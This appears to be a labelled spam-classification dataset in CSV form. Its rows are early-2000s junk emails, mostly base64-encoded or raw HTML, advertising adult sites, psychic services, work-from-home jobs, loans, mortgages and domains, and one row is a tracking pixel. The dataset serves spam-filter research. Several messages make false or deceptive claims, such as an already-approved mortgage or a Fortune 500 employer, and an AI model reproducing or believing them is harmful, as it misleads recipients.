spam_label,text,text_cleaned
1,PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEg VHJhbnNpdGlvbmFsLy9FTiI+DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPkFk dWx0IENsYXNzaWZpZWQgMmsyPC90aXRsZT4NCjxtZXRhIGh0dHAtZXF1aXY9 IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlz by04ODU5LTEiPg0KPC9oZWFkPg0KDQo8Ym9keSBiZ2NvbG9yPSIjRkZGRkZG IiBsaW5rPSIjQ0M5OTk5IiBsZWZ0bWFyZ2luPSIwIiB0b3BtYXJnaW49IjAi IG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPg0KDQo8Y2VudGVy Pg0KICA8YnI+DQogIDx0YWJsZSB3aWR0aD0iNjAwIiBib3JkZXI9IjAiIGNl bGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMSI+DQogICAgPHRyPg0KICAg ICAgPHRkIGJnY29sb3I9IiM5OTAwMDAiPjx0YWJsZSB3aWR0aD0iNjAwIiBi b3JkZXI9IjAiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCI+DQog ICAgICAgICAgPHRyPg0KICAgICAgICAgICAgPHRkIGJnY29sb3I9IiNGRkZG RkYiPg0KICAgICAgICAgIA0KICAgICAgICAgIDxkaXYgYWxpZ249InJpZ2h0 Ij48aW1nIHNyYz0iaHR0cDovL3d3dy54eHhtYXRjaC5uZXQvbG9nby5qcGci IHdpZHRoPSI2MDAiIGhlaWdodD0iNjUiPjxicj4NCiAgICAgICAgICA8Yj48 Zm9udCBjb2xvcj0iI0NDMDAzMyIgc2l6ZT0iMiIgZmFjZT0iR2VuZXZhLCBB cmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj4tLS0gVGhlIG1vc3QgY29t cHJlaGVuc2l2ZSBhZHVsdCBtYXRjaCBtYWtpbmcgc2VydmljZTxicj4NCiAg ICAgICAgICA8YnI+DQogICAgICAgICAgICAgICAgICAgIDwvZm9udD48L2I+ DQo8L2Rpdj48L3RkPg0KICAgICAgICAgIDwvdHI+DQogICAgICAgICAgPHRy Pg0KICAgICAgICAgICAgPHRkIGJnY29sb3I9IiNGRkZGRkYiPjxjZW50ZXI+ DQogICAgICAgICAgICAgICAgPHRhYmxlIHdpZHRoPSI0MDAiIGJvcmRlcj0i MCIgY2VsbHNwYWNpbmc9IjMiIGNlbGxwYWRkaW5nPSIxIj4NCiAgICAgICAg ICAgICAgICAgIDx0ciBiZ2NvbG9yPSIjOTkwMDAwIj4NCiAgICAgICAgICAg ICAgICAgICAgPHRkIHdpZHRoPSIxMDAiPjxpbWcgc3JjPSJodHRwOi8vd3d3 Lnh4eG1hdGNoLm5ldC9mcm9udHBpYy00LmdpZiIgd2lkdGg9IjEwMCIgaGVp Z2h0PSIxNTAiPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDx0ZCB3aWR0 aD0iMTAwIj48aW1nIHNyYz0iaHR0cDovL3d3dy54eHhtYXRjaC5uZXQvZnJv bnRwaWNtLTIuZ2lmIiB3aWR0aD0iMTAwIiBoZWlnaHQ9IjE1MCI+PC90ZD4N CiAgICAgICAgICAgICAgICAgICAgPHRkIHdpZHRoPSIxMDAiPjxpbWcgc3Jj PSJodHRwOi8vd3d3Lnh4eG1hdGNoLm5ldC9mcm9udHBpYy0yLmdpZiIgd2lk dGg9IjEwMCIgaGVpZ2h0PSIxNTAiPjwvdGQ+DQogICAgICAgICAgICAgICAg ICAgIDx0ZCB3aWR0aD0iMTAwIj48aW1nIHNyYz0iaHR0cDovL3d3dy54eHht YXRjaC5uZXQvZnJvbnRwaWNtLTEuZ2lmIiB3aWR0aD0iMTAwIiBoZWlnaHQ9 IjE1MCI+PC90ZD4NCiAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAgICAg ICAgICAgICAgPC90YWJsZT4NCiAgICAgICAgICAgICAgICA8Zm9udCBjb2xv cj0iIzk5MDAwMCIgc2l6ZT0iMSIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhl bHZldGljYSwgc2Fucy1zZXJpZiI+Q2hlY2sgc29tZSBvZiBvdXIgIGFjdHVh bCBwaWN0dXJlcyBmcm9tIDxiPnJlYWw8L2I+IG1lbWJlcnMhPC9mb250Pjxi cj4NCiAgICAgICAgICAgICAgICA8dGFibGUgd2lkdGg9IjQyMCIgYm9yZGVy PSIwIiBjZWxsc3BhY2luZz0iMyIgY2VsbHBhZGRpbmc9IjEiPg0KICAgICAg ICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICA8dGQ+PGNl bnRlcj4NCiAgICAgICAgICAgICAgICAgIDxmb250IGNvbG9yPSIjOTkwMDAw IiBzaXplPSIyIiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBz YW5zLXNlcmlmIj48YnI+DQogICAgICAgICAgICAgICAgICA8YnI+DQogICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2ZvbnQ+PGZvbnQg c2l6ZT0iMiIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fu cy1zZXJpZiI+PC9mb250Pjxmb250IGNvbG9yPSIjOTkwMDAwIiBzaXplPSIy IiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlm Ij48Yj5XZWxjb21lPC9iPiB0byBvbmUgb2YgdGhlIEludGVybmV0J3MgcHJl bWllciBhZHVsdCBtYXRjaCBtYWtpbmcgc2VydmljZXMgd2hlcmUgcGVvcGxl IGp1c3QgbGlrZSB5b3Vyc2VsZiBjYW4gdmlldyBhbmQgcGxhY2UgcGVyc29u YWwgYWR2ZXJ0aXNlbWVudHMgd2hpY2ggYXJlIHZpZXdlZCBieSB0aG91c2Fu ZHMgZGFpbHkhDQo8YnI+DQogICAgICAgICAgICAgICAgICA8YnI+DQogICAg ICAgICAgICAgICAgICA8L2ZvbnQ+DQogICAgICAgICAgICAgICAgICAgICAg PC9jZW50ZXI+DQogICAgICAgICAgICAgICAgICAgICAgPGNlbnRlcj4NCiAg ICAgICAgICAgICAgICAgIDxmb250IGNvbG9yPSIjOTkwMDAwIiBzaXplPSIy IiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlm Ij4NCiAgICAgICAgICAgICAgICBXZWIgQWR1bHQgQ2xhc3NpZmllZHMgaGFz IHRob3VzYW5kcyBvZiBhZHMgLSBzb21ldGhpbmcgZm9yIGV2ZXJ5b25lLCBt YWxlIG9yIGZlbG1hbGUhIA0KICAgICAgICAgICAgICAgIDwvZm9udD4NCiAg ICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgIDxmb250IGNvbG9y PSIjOTkwMDAwIiBzaXplPSIyIiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVs dmV0aWNhLCBzYW5zLXNlcmlmIj48YnI+DQogICAgICAgICAgICAgICAgICA8 YnI+DQogICAgICAgICAgICAgICAgICA8L2ZvbnQ+PGZvbnQgc2l6ZT0iMiIg ZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+ DQogICAgICAgICAgICAgICAgICA8YnI+DQogICAgICAgICAgICAgICAgICA8 aW1nIHNyYz0iaHR0cDovL3d3dy54eHhtYXRjaC5uZXQvaGVhcnQuZ2lmIiB3 aWR0aD0iMTUiIGhlaWdodD0iMTMiPiZuYnNwOyAgICAgICAgICAgICAgICAg IA0KICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iaHR0cDovL3d3dy54eHht YXRjaC5uZXQvdmVyaWZ5Lmh0bSI+PGI+Q2xpY2sgaGVyZSB0byBiZSBjb252 aW5jZWQ8L2I+PC9hPiZuYnNwOyZuYnNwOzxpbWcgc3JjPSJodHRwOi8vd3d3 Lnh4eG1hdGNoLm5ldC9oZWFydC5naWYiIHdpZHRoPSIxNSIgaGVpZ2h0PSIx MyI+PGJyPg0KICAgICAgICAgICAgICAgICAgPGZvbnQgY29sb3I9IiM5OTAw MDAiIHNpemU9IjEiPjxiPih3aWxsIG9wZW4gaW4gYSBuZXcgd2luZG93IGZv ciB5b3VyIGNvbnZlbmllbmNlKTwvYj48L2ZvbnQ+PC9mb250Pjxicj4NCiAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2NlbnRlcj48L3Rk Pg0KICAgICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICA8 L3RhYmxlPg0KICAgICAgICAgICAgICAgIDxicj4NCiAgICAgICAgPC9jZW50 ZXI+PC90ZD4NCiAgICAgICAgICA8L3RyPg0KICA8L3RhYmxlPjwvdGQ+DQog ICAgPC90cj4NCiAgPC90YWJsZT4NCiAgDQogIDx0YWJsZSB3aWR0aD0iNjAw IiBib3JkZXI9IjAiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCI+ DQogICAgPHRyPg0KICAgICAgPHRkPjxkaXYgYWxpZ249InJpZ2h0Ij48Zm9u dCBzaXplPSIxIiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBz YW5zLXNlcmlmIj48Yj4mY29weTtYeHhNYXRjaC5uZXQgMjAwMjwvYj48L2Zv bnQ+DQo8L2Rpdj48L3RkPg0KICAgIDwvdHI+DQogIDwvdGFibGU+DQogIDxi cj4NCjwvY2VudGVyPg0KPC9ib2R5Pg0KPC9odG1sPg0KDQo0MTk5bHJqbDc=,
1,"<html><head></head><body bgcolor=3Dblack> <table border=3D0 cellspacing=3D0 cellpadding=3D5 align=3Dcenter><tr><th b= gcolor=3D""#8FB3C5""> <table border=3D0 cellspacing=3D0 cellpadding=3D5 align=3Dcenter><tr><th b= gcolor=3D""#000000""> <table border=3D0 cellspacing=3D0 cellpadding=3D0 align=3Dcenter> <tr> <th><a href=3D""http://psychicrevenue.com/cgi-bin/refer.cgi?pws01014&site=3D= pw""> <img src=3D""http://giftedpsychic.com/images/r1c1.jpg"" width=3D279 height=3D= 286 border=3D0></a></th> <th><a href=3D""http://psychicrevenue.com/cgi-bin/refer.cgi?pws01014&site=3D= pw""> <img src=3D""http://giftedpsychic.com/images/r1c2.gif"" width=3D301 height=3D= 286 border=3D0></a></th> </tr> <tr> <th><a href=3D""http://psychicrevenue.com/cgi-bin/refer.cgi?pws01014&site=3D= pw""> <img src=3D""http://giftedpsychic.com/images/r2c1.jpg"" width=3D279 height=3D= 94 border=3D0></a></th> <th><a href=3D""http://psychicrevenue.com/cgi-bin/refer.cgi?pws01014&site=3D= pw""> <img src=3D""http://giftedpsychic.com/images/r2c2.jpg"" width=3D301 height=3D= 94 border=3D0></a></th> </tr> </table></th></tr></table</th></tr></table></body></html>",
1,PGh0bWw+DQoNCjxib2R5IGJnY29sb3I9IiNGRkZGRkYiIHRleHQ9IiMwMDAw MDAiPiANCjxwIGFsaWduPSJjZW50ZXIiPjxhIGhyZWY9Imh0dHA6Ly93d3cu ZGlyZWN0d2Vic3RvcmUuY29tL3RveXMvaW5kZXguaHRtbCI+PGltZyBzcmM9 Imh0dHA6Ly93d3cuZGlyZWN0d2Vic3RvcmUuY29tL21waWMuanBnIiB3aWR0 aD0iNTAwIiBoZWlnaHQ9IjMzOSIgYm9yZGVyPSIwIj48L2E+PGJyPiANCjxm b250IHNpemU9IjMiIGZhY2U9IkFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2Vy aWYiPjxhIGhyZWY9Imh0dHA6Ly93d3cuZGlyZWN0d2Vic3RvcmUuY29tL3Rv eXMvaW5kZXguaHRtbCI+PGI+RU5URVIgDQpOT1cgaWYgeW91IGFyZSAxOCBh bmQgb3ZlcjwvYj48L2E+PC9mb250PjwvcD4gDQo8cCBhbGlnbj0iY2VudGVy Ij48Zm9udCBmYWNlPSJBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIiBz aXplPSI0IiBjb2xvcj0iI0ZGMDAwMCI+PGI+U1BFQ0lBTCANCk9GRkVSPGJy PiANCjxmb250IHNpemU9IjUiPjMwIERheXMgPGk+RlJFRSBhY2Nlc3M8L2k+ IDwvZm9udD48YnI+IA0KdG8gdGhlIGxhcmdlc3QgQWR1bHRzaXRlIG9uIHRo ZSB3ZWIuPGJyPiANCjwvYj4gPGZvbnQgc2l6ZT0iMiI+Zm9yIG9yZGVycyBv dmVyICQxMDA8L2ZvbnQ+PC9mb250PjwvcD4gDQo8cCBhbGlnbj0iY2VudGVy Ij48Zm9udCBzaXplPSIyIiBmYWNlPSJBcmlhbCwgSGVsdmV0aWNhLCBzYW5z LXNlcmlmIj48Yj48Zm9udCBzaXplPSI0IiBjb2xvcj0iIzAwMDBGRiI+UmVh ZHkgDQp0byBnbyBTaG9wcGluZz8gPC9mb250PjwvYj48YnI+IA0KWW91IGNh biBmZWVsIHNhZmUgc2hvcHBpbmcgb3VyIHNlY3VyZSBvbmxpbmUgc3RvcmUu IDxicj4gDQpZb3VyIHByaXZhY3kgYW5kIGNvbmZpZGVudGlhbGl0eSBpcyBv dXIgcHJpb3JpdHkuIDxicj4gDQpBbGwgb3JkZXJzIGFyZSBwYWNrZWQgaW4g YSBkaXNjcmVldCBwcmlvcml0eSBtYWlsIGJveC4gPGJyPiANCldlIG5ldmVy IHNoYXJlIHlvdXIgaW5mb3JtYXRpb24gd2l0aCBhbnlvbmUuIE9yZGVycyBz aGlwcGVkIHdpdGhpbiAyNCBob3Vycy48L2ZvbnQ+PC9wPiANCg0KPHAgYWxp Z249ImNlbnRlciI+PGZvbnQgc2l6ZT0iMyIgZmFjZT0iQXJpYWwsIEhlbHZl dGljYSwgc2Fucy1zZXJpZiI+PGEgaHJlZj0iaHR0cDovL3d3dy5kaXJlY3R3 ZWJzdG9yZS5jb20vdG95cy9pbmRleC5odG1sIj48Yj48Zm9udCBzaXplPSI1 Ij5FTlRFUiANCk5PVzwvZm9udD48L2I+PC9hPjwvZm9udD48L3A+IA0KPHAg YWxpZ249ImNlbnRlciI+Jm5ic3A7PC9wPiANCjxwIGFsaWduPSJjZW50ZXIi PiZuYnNwOzwvcD4gDQo8cCBhbGlnbj0iY2VudGVyIj48Zm9udCBzaXplPSIx IiBmYWNlPSJBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj5UaGlzIEUt bWFpbGluZyANCmhhcyBiZWVuIHNlbnQgdG8geW91IGFzIGEgcGVyc29uIGlu dGVyZXN0ZWQgaW4gdGhlIGluZm9ybWF0aW9uIGVuY2xvc2VkLiA8YnI+IA0K SWYgdGhpcyByZWFjaGVkIHlvdSBieSBlcnJvciwgb3IgeW91IGRvIG5vdCB3 aXNoIHRvIHJlY2VpdmUgdGhpcyBpbmZvcm1hdGlvbiANCm9yIHR5cGUgb2Yg aW5mb3JtYXRpb24gaW4gdGhlIGZ1dHVyZSwgPGJyPiANCnBsZWFzZSBjbGlj ayBvbiB0aGUgd29yZDxhIGhyZWY9Im1haWx0bzptaW5pcmVtQGZpcmVtYWls LmRlIj4gUkVNT1ZFIDwvYT5hbmQgDQpyZXBseSB0aGlzIGVtYWlsIHRvIHVz LCB5b3Ugd2lsbCBiZSB0YWtlbiBvZmYgb3VyIGxpc3QgaW1tZWRpYXRlbHkg YW5kIE5FVkVSIA0KcmVjZWl2ZSBhbnkgZW1haWxzIGZyb20gdXMuPC9mb250 PjwvcD4gDQo8cCBhbGlnbj0iY2VudGVyIj4mbmJzcDs8L3A+IA0KPHAgYWxp Z249ImNlbnRlciI+Jm5ic3A7PC9wPiANCjxwIGFsaWduPSJjZW50ZXIiPiZu YnNwOzwvcD4gDQo8cCBhbGlnbj0iY2VudGVyIj4mbmJzcDs8L3A+IA0KPHAg YWxpZ249ImNlbnRlciI+Jm5ic3A7PC9wPiANCjwvYm9keT4gDQo8L2h0bWw+ DQoxMzkzUHdxYjAtMjYxU0JjSDAzNTdtaEdxMS0xMDN1VHVQOTA3NkFyd3gw LTI1Nm5ad2M0NjA2aWtDSzUtNDUyS2VzdzM1NjhFT29JNC00NjFQbDc3,
1,UGxlYXNlIGZvcmdpdmUgdGhlIGludHJ1c2lvbiwgdGhpcyBpcyBhIG9uZSB0aW1lIG9ubHkg dGVzdCwgcGxlYXNlIGRlbGV0ZS4gDQpZb3Ugc2hvdWxkIG5vdCByZWNlaXZlIGFueSBhZGRp dGlvbmFsIGVtYWlscyBmcm9tIHRoaXMgYWRkcmVzcywgaWYgeW91IGRvIHBsZWFzZSBzZW5k IGFuIGVtYWlsIA0Kd2l0aCByZW1vdmUgYXMgc3ViamVjdCB0bzoNCg0KdGVzdDc5OTFAeWFo b28uY29tDQoNClRoYW5rIHlvdSBmb3IgeW91ciB1bmRlcnN0YW5kaW5nLg0KDQogICAg,
1,"<HTML> <BODY> <iframe align=""center"" marginwidth=0 marginheight=0 src=""http://www.callin.net/20020827"" frameborder=0 width=800 scrolling=no height=1700 name=""ticker""></iframe> </BODY></HTML>",
1,SGVscCB3YW50ZWQuICBXZSBhcmUgYSAxNCB5ZWFyIG9sZCBmb3J0dW5lIDUw MCBjb21wYW55LCB0aGF0IGlzDQpncm93aW5nIGF0IGEgdHJlbWVuZG91cyBy YXRlLiAgV2UgYXJlIGxvb2tpbmcgZm9yIGluZGl2aWR1YWxzIHdobw0Kd2Fu dCB0byB3b3JrIGZyb20gaG9tZS4NCg0KVGhpcyBpcyBhbiBvcHBvcnR1bml0 eSB0byBtYWtlIGFuIGV4Y2VsbGVudCBpbmNvbWUuICBObyBleHBlcmllbmNl DQppcyByZXF1aXJlZC4gIFdlIHdpbGwgdHJhaW4geW91Lg0KDQpTbyBpZiB5 b3UgYXJlIGxvb2tpbmcgdG8gYmUgZW1wbG95ZWQgZnJvbSBob21lIHdpdGgg YSBjYXJlZXIgdGhhdCBoYXMNCnZhc3Qgb3Bwb3J0dW5pdGllcywgdGhlbiBn bzoNCg0KaHR0cDovL3d3dy5iYXNldGVsLmNvbToyNzAwMC93ZWFsdGhub3cN Cg0KV2UgYXJlIGxvb2tpbmcgZm9yIGVuZXJnZXRpYyBhbmQgc2VsZiBtb3Rp dmF0ZWQgcGVvcGxlLiAgSWYgdGhhdCBpcyB5b3UNCnRoYW4gY2xpY2sgb24g dGhlIGxpbmsgYW5kIGZpbGwgb3V0IHRoZSBmb3JtLCBhbmQgb25lIG9mIG91 cg0KZW1wbG95ZW1lbnQgc3BlY2lhbGlzdCB3aWxsIGNvbnRhY3QgeW91Lg0K DQpUbyBiZSByZW1vdmVkIGZyb20gb3VyIGxpbmsgc2ltcGxlIGdvIHRvOg0K DQpodHRwOi8vd3d3LmJhc2V0ZWwuY29tOjI3MDAwL3JlbW92ZS5odG1sDQoN Cg==,
1,bG92ZQ0KV29ybGQgQ2FwaXRhbCBHcm91cCBpcyBhIGdyb3VwIG9mIEZ1bmRp bmcgU291cmNlcyB0aGF0IGhlbHAgYnVzaW5lc3NlcyANCndpdGggdGhlaXIg ZmluYW5jaWFsIG5lZWRzLiAgV2UgY2FuIHByb3ZpZGUgV29ya2luZyBDYXBp dGFsIHRvICQxNTAsMDAwIA0Kb24gYW4gdW5zZWN1cmVkIGJhc2lzOyB3aGlj aCBjYW4gYmUgdXNlZCB0byB0YWtlIGNhcmUgb2YgY2FzaCBmbG93IA0KbmVl ZHMsIHByb3ZpZGUgZnVuZHMgZm9yIGV4cGFuc2lvbiBhbmQgb3RoZXIgbmVl ZHMgeW91ciBidXNpbmVzcyBoYXMgKFVTIA0KYnVzaW5lc3NlcyBvbmx5KS4g IFdlIGFsc28gcHVyY2hhc2UgSW52b2ljZXMsIEFjY291bnRzIFJlY2VpdmFi bGVzLCANCkxlYXNlcywgQXV0byBQb3J0Zm9saW9zLCBCdXNpbmVzcyBhbmQg UmVhbCBFc3RhdGUgTm90ZXMsIGFuZCBvdGhlciBDYXNoIA0KRmxvd3MuICBJ ZiB5b3Ugd291bGQgbGlrZSB0byBpbnF1aXJlIGFib3V0IHVzIGhlbHBpbmcg eW91IHRvZGF5IHdpdGggeW91ciANCmNhcGl0YWwgbmVlZHMsIHBsZWFzZSBj bGljayBvbiB0aGUgbGluayBiZWxvdyBmb3IgZGV0YWlscyBhbmQgc3VibWlz c2lvbiANCmZvcm0uICBUaHggZm9yIHlvdXIgdGltZS4gIFdvcmxkIENhcGl0 YWwgR3JvdXANCg0KaHR0cDovL3d3dy5tYWlscGFpbC5jb20NCg0KaHR0cDov L3d3dy5tYWlscGFpbC5jb20NCg0KDQoNCg0KDQoNCg0KDQoNCmxvdmUNCg0K DQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoN Cg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0K DQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KbG92ZQ0KDQpZb3UgYXJlIHJlY2ll dmluZyB0aGlzIGVtYWlsIGFzIGEgc3Vic2NyaWJlciBvciBhZmZpbGlhdGUg c3VjYnNjcmliZXIgDQp0byBvcHRpbiBuZXR3b3JrLiAgSWYgeW91IGhhdmUg cmVjZWl2ZWQgdGhpcyBhcyBhbiBlcnJvciBvciB3b3VsZCBsaWtlIA0KdG8g YmUgdGFrZW4gb2ZmIG91ciBsaXN0IHBsZWFzZSBzZW5kIGFuIGVtYWlsIHRv IG5vcm1vcmVAZXlvdS5jb20uICBUaGFuayANCnlvdSBhbmQgaGF2ZSBhIGdy ZWF0IGRheS5sb3ZlDQowOTgxWFZLVjktMTE1eWFMbDkzMDlRUGFsMjM=,
1,SGVscCB3YW50ZWQuICBXZSBhcmUgYSAxNCB5ZWFyIG9sZCBmb3J0dW5lIDUw MCBjb21wYW55LCB0aGF0IGlzDQpncm93aW5nIGF0IGEgdHJlbWVuZG91cyBy YXRlLiAgV2UgYXJlIGxvb2tpbmcgZm9yIGluZGl2aWR1YWxzIHdobw0Kd2Fu dCB0byB3b3JrIGZyb20gaG9tZS4NCg0KVGhpcyBpcyBhbiBvcHBvcnR1bml0 eSB0byBtYWtlIGFuIGV4Y2VsbGVudCBpbmNvbWUuICBObyBleHBlcmllbmNl DQppcyByZXF1aXJlZC4gIFdlIHdpbGwgdHJhaW4geW91Lg0KDQpTbyBpZiB5 b3UgYXJlIGxvb2tpbmcgdG8gYmUgZW1wbG95ZWQgZnJvbSBob21lIHdpdGgg YSBjYXJlZXIgdGhhdCBoYXMNCnZhc3Qgb3Bwb3J0dW5pdGllcywgdGhlbiBn bzoNCg0KaHR0cDovL3d3dy5iYXNldGVsLmNvbToyNzAwMC93ZWFsdGhub3cN Cg0KV2UgYXJlIGxvb2tpbmcgZm9yIGVuZXJnZXRpYyBhbmQgc2VsZiBtb3Rp dmF0ZWQgcGVvcGxlLiAgSWYgdGhhdCBpcyB5b3UNCnRoYW4gY2xpY2sgb24g dGhlIGxpbmsgYW5kIGZpbGwgb3V0IHRoZSBmb3JtLCBhbmQgb25lIG9mIG91 cg0KZW1wbG95ZW1lbnQgc3BlY2lhbGlzdCB3aWxsIGNvbnRhY3QgeW91Lg0K DQpUbyBiZSByZW1vdmVkIGZyb20gb3VyIGxpbmsgc2ltcGxlIGdvIHRvOg0K DQpodHRwOi8vd3d3LmJhc2V0ZWwuY29tL3JlbW92ZS5odG1sDQoNCg==,
0,DQoNCg0KU1VCU0NSSVBUSU9OIElORk9STUFUSU9ODQoqKioqDQpZb3UgaGF2ZSByZWNlaXZlZCB0 aGlzIGUtbWFpbCBiZWNhdXNlIHlvdSBhcmUgYW4gRURDIHJlZ2lzdHJhbnQgb3IgeW91IHByZXZp b3VzbHkgcmVxdWVzdGVkIGluZm9ybWF0aW9uIGZyb20gRXNwaWFsLiAgSWYgeW91IHdpc2ggdG8g YmUgcmVtb3ZlZCBmcm9tIHRoaXMgbGlzdCwgcGxlYXNlIHJlcGx5IHRvIGZhY2VsaXN0QGVzcGlh bC5jb20gYW5kIGluY2x1ZGUgdGhlIHdvcmRzICd1bnN1YnNjcmliZSBURVhUJyAod2l0aG91dCBx dW90ZXMpIGluIHRoZSBTVUJKRUNUIExJTkUuDQoNClRvIGdldCB0aGUgdmVyc2lvbiB3aXRoIHBp Y3R1cmVzLCBzZW5kIGFuIGVtYWlsIHRvIGZhY2VsaXN0QGVzcGlhbC5jb20gd2l0aCB0aGUgc3Vi amVjdCBsaW5lICJTVUJTQ1JJQkUgSFRNTCINCg0KKGMpIDIwMDIsIEVzcGlhbCBHcm91cCBJbmMu LCBFc3BpYWwgRXNwcmVzc28sIEVzcGlhbCBFc2NhcGUsIEVzcGlhbCBFYm94LCBFc3BpYWwgQXNz aXN0YW50LCBFc3BpYWwgRGV2aWNlVG9wIGFuZCBFc3BpYWwgRGV2aWNlU2VydmVyIGFyZSB0cmFk ZW1hcmtzIG9mIEVzcGlhbCBHcm91cC4gQWxsIG90aGVyIHRyYWRlbWFya3MgYmVsb25nIHRvIHRo ZWlyIHJlc3BlY3RpdmUgb3duZXJzLiBBbGwgcmlnaHRzIHJlc2VydmVkDQoqKioqDQoNCg0K,
1,<html><body><IMG SRC='http://master2.free4all.com/cgi-bin/sp/t.pl?id=6:56446664&o=1&d=1' BORDER=0 WIDTH=0 HEIGHT=0/><center><img src=http://www.vitafactory.com/ad-friday/test.gif border=0></body></html>,
1,WW91ciBtb3J0Z2FnZSBoYXMgYmVlbiBhcHByb3ZlZC4NCg0KTm93IGFwcGx5 IGZvciBob3cgbXVjaCB5b3UgZ2V0IQ0KDQpodHRwOi8vNjYuMjMxLjEzMy4y MDEvRnJlZS8NCg0KDQoNCg0KVG8gYmUgcmVtb3ZlZCBmcm9tIG91ciBtYWls aW5nIGNsaWNrIGhlcmUNCg0KaHR0cDovLzY2LjIzMS4xMzMuMjAxL1JlbW92 ZS8NCjI4NzB4dGlhMi02NjlqZUNqNjk1NHJ2d0M2LTI2OVZ2cWg3MDkyTkts Mzg=,
1,http://www.rebackee.com/cursos2/contraloria.htm,
1,eyVSQU5EfQ0KUFVCTElDIEFOTk9VTkNFTUVOVDoNCg0KVGhlIG5ldyBkb21h aW4gbmFtZXMgYXJlIGZpbmFsbHkgYXZhaWxhYmxlIHRvIHRoZSBnZW5lcmFs IHB1YmxpYyBhdCBkaXNjb3VudCBwcmljZXMuIE5vdyB5b3UgY2FuIHJlZ2lz dGVyIG9uZSBvZiB0aGUgZXhjaXRpbmcgbmV3IC5CSVogb3IgLklORk8gZG9t YWluIG5hbWVzLCBhcyB3ZWxsIGFzIHRoZSBvcmlnaW5hbCAuQ09NIGFuZCAu TkVUIG5hbWVzIGZvciBqdXN0ICQxNC45NS4gVGhlc2UgYnJhbmQgbmV3IGRv bWFpbiBleHRlbnNpb25zIHdlcmUgcmVjZW50bHkgYXBwcm92ZWQgYnkgSUNB Tk4gYW5kIGhhdmUgdGhlIHNhbWUgcmlnaHRzIGFzIHRoZSBvcmlnaW5hbCAu Q09NIGFuZCAuTkVUIGRvbWFpbiBuYW1lcy4gVGhlIGJpZ2dlc3QgYmVuZWZp dCBpcyBvZi1jb3Vyc2UgdGhhdCB0aGUgLkJJWiBhbmQgLklORk8gZG9tYWlu IG5hbWVzIGFyZSBjdXJyZW50bHkgbW9yZSBhdmFpbGFibGUuIGkuZS4gaXQg d2lsbCBiZSBtdWNoIGVhc2llciB0byByZWdpc3RlciBhbiBhdHRyYWN0aXZl IGFuZCBlYXN5LXRvLXJlbWVtYmVyIGRvbWFpbiBuYW1lIGZvciB0aGUgc2Ft ZSBwcmljZS4gIFZpc2l0OiBodHRwOi8vd3d3LmFmZm9yZGFibGUtZG9tYWlu cy5jb20gdG9kYXkgZm9yIG1vcmUgaW5mby4NCiANClJlZ2lzdGVyIHlvdXIg ZG9tYWluIG5hbWUgdG9kYXkgZm9yIGp1c3QgJDE0Ljk1IGF0OiBodHRwOi8v d3d3LmFmZm9yZGFibGUtZG9tYWlucy5jb20uIFJlZ2lzdHJhdGlvbiBmZWVz IGluY2x1ZGUgZnVsbCBhY2Nlc3MgdG8gYW4gZWFzeS10by11c2UgY29udHJv bCBwYW5lbCB0byBtYW5hZ2UgeW91ciBkb21haW4gbmFtZSBpbiB0aGUgZnV0 dXJlLg0KIA0KU2luY2VyZWx5LA0KIA0KRG9tYWluIEFkbWluaXN0cmF0b3IN CkFmZm9yZGFibGUgRG9tYWlucw0KDQoNClRvIHJlbW92ZSB5b3VyIGVtYWls IGFkZHJlc3MgZnJvbSBmdXJ0aGVyIHByb21vdGlvbmFsIG1haWxpbmdzIGZy b20gdGhpcyBjb21wYW55LCBjbGljayBoZXJlOg0KaHR0cDovL3d3dy5jZW50 cmFscmVtb3ZhbHNlcnZpY2UuY29tL2NnaS1iaW4vZG9tYWluLXJlbW92ZS5j Z2kNCjMwDQoNCg0KWzk0MzBwSGJUNC04OThsR3lRODA1OWlDdU0zLTQwMGdZ cUs3NjYxY1VtRzMtOTE5elJMRDcxNjB2cGh6Mi01MjFUTERANjNdDQo=,
